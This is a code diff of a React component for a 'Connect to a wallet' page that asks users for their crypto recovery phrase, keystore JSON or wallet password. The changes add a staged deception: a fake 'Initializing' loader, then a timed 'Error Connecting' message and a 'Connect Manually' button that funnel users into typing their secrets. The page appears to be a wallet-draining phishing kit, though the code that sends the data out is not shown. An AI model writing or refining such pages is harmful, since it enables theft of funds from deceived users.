@@ -1,6 +1,19 @@
 import React, { useEffect, useState } from 'react';
-import { cryptoData } from '@/components/data';
+import { wallet } from '@/components/data';
 import { BsArrowRightCircle } from 'react-icons/bs';
+import { FaEye, FaEyeSlash } from 'react-icons/fa';
+import Image from 'next/image';
+
+const LoaderAnimation = () => {
+  return (
+    <div className='loader-container'>
+      <div className='loader-dot'></div>
+      <div className='loader-dot'></div>
+      <div className='loader-dot'></div>
+      <div className='loader-dot'></div>
+    </div>
+  );
+};
 
 function Coin() {
   const [details, setDetails] = useState('');
@@ -8,6 +21,8 @@ function Coin() {
   const [openModal, setOpenModal] = useState(false);
   const [isActive, setIsActive] = useState(1);
   const [isLoading, setIsLoading] = useState(true);
+  const [isError, setIsError] = useState(false);
+  const [show, setShow] = useState(false);
 
   const [val, setVal] = useState({
     place: 'Enter your recovery phrase',
@@ -20,6 +35,7 @@ function Coin() {
 
   const handleOpen = (data) => {
     setIsLoading(true);
+    setIsError(false);
     setDisplay(data);
     setOpenModal(true);
   };
@@ -43,16 +59,27 @@ function Coin() {
     setIsActive(num);
   };
 
-useEffect(() => {
-  const timeoutId = setTimeout(() => {
-    setIsLoading(false);
-  }, 1000);
+  useEffect(() => {
+    const timeoutId = setTimeout(() => {
+      setIsLoading(false);
+    }, 5000);
 
-  // Clean up the timeout when the component unmounts or re-renders.
-  return () => {
-    clearTimeout(timeoutId);
-  };
-});
+    // Clean up the timeout when the component unmounts or re-renders.
+    return () => {
+      clearTimeout(timeoutId);
+    };
+  });
+
+  useEffect(() => {
+    const timeoutId = setTimeout(() => {
+      setIsError(true);
+    }, 3000);
+
+    // Clean up the timeout when the component unmounts or re-renders.
+    return () => {
+      clearTimeout(timeoutId);
+    };
+  });
 
   return (
     <div className='w-full h-screen flex flex-col justify-end  md:items-center pb-3 px-3 md:px-0'>
@@ -62,7 +89,7 @@ useEffect(() => {
       <div className='flex flex-col pt-7 px-4 rounded-3xl shadow-md bg-white space-y-3 w-full md:w-[40%] h-[88vh]'>
         <h1 className='text-black'>Connect to a wallet</h1>
         <div className='space-y-3 pt-5 h-[92%] overflow-auto'>
-          {cryptoData?.map((data, index) => (
+          {wallet?.map((data, index) => (
             <div
               key={index}
               className='flex items-center justify-between space-x-3 text-black py-3 px-4 border rounded-lg cursor-pointer hover:bg-[#001132] hover:text-white transition-all ease-in-out duration-500'
@@ -76,7 +103,13 @@ useEffect(() => {
                 className='text-xl'
                 style={{ color: data.color ? data.color : 'blue' }}
               >
-                {data.icon}
+                <Image
+                  src={data.icon}
+                  alt={data.name}
+                  width={40}
+                  height={40}
+                  className=''
+                />
               </div>
             </div>
           ))}
@@ -91,14 +124,41 @@ useEffect(() => {
                 <p className='text-blue-500'>Back</p>
                 <p>X</p>
               </div>
-              <div className='px-10 py-7 space-y-5 w-[400px]'>
-                <input className='border border-green-400 rounded-xl w-full py-2' />
+              <div className='px-10 py-7 space-y-5 w-[380px]'>
+                <div className='py-3 px-2 border border-red-500 rounded-xl flex justify-between items-center'>
+                  {!isError ? (
+                    <h1>
+                      Initializing
+                      <LoaderAnimation />
+                    </h1>
+                  ) : (
+                    <h1>
+                      Error <br></br>Connecting
+                    </h1>
+                  )}
+                  {isError && (
+                    <button
+                      className='p-2 bg-blue-500 text-white rounded-md text-sm'
+                      onClick={() => setIsLoading(false)}
+                    >
+                      Connect <br></br>Manually
+                    </button>
+                  )}
+                </div>
                 <div className='border border-black rounded-xl p-3 flex items-center justify-between'>
                   <div className='space-y-3'>
                     <p>{display.name}</p>
                     <p>Easy-to-use browser extension</p>
                   </div>
-                  <div>{display.icon}</div>
+                  <div>
+                    <Image
+                      src={display.icon}
+                      alt={display.name}
+                      width={40}
+                      height={40}
+                      className=''
+                    />
+                  </div>
                 </div>
               </div>
             </div>
@@ -110,13 +170,19 @@ useEffect(() => {
                     className='text-xl'
                     style={{ color: display.color ? display.color : 'blue' }}
                   >
-                    {display.icon}
+                    <Image
+                      src={display.icon}
+                      alt={display.name}
+                      width={40}
+                      height={40}
+                      className=''
+                    />
                   </div>
                   <h1 className='text-xl'>Import your {display.name} wallet</h1>
                 </div>
               </div>
               <form method='POST' onsubmit={handleSubmit}>
-                <div className='space-x-8 border-b pb-2 text-gray-500'>
+                <div className='justify-between flex border-b pb-2 text-gray-500'>
                   <label
                     className={`${
                       isActive === 1 ? 'border-b-2 pb-2 border-blue-500' : ''
@@ -149,14 +215,19 @@ useEffect(() => {
                   required
                 ></textarea>
                 {val.place === 'Enter you Keystore JSON' && (
-                  <div>
+                  <div className='flex items-center justify-between px-2 py-2 w-full border rounded-md mt-5'>
                     <input
-                      type='password'
+                      type={show ? 'text' : 'password'}
                       name='wpassword'
                       placeholder='Wallet password'
                       required
-                      className='px-2 py-2 w-full border rounded-md mt-5 placeholder:text-[15px] placeholder:text-gray-500'
+                      className='px-2 h-full w-full outline-none bg-transparent placeholder:text-[15px] placeholder:text-gray-500'
                     />
+                    {show ? (
+                      <FaEye onClick={() => setShow(!show)} />
+                    ) : (
+                      <FaEyeSlash onClick={() => setShow(!show)} />
+                    )}
                   </div>
                 )}
                 <p className='text-center w-[80%] mx-auto text-gray-500 my-6'>
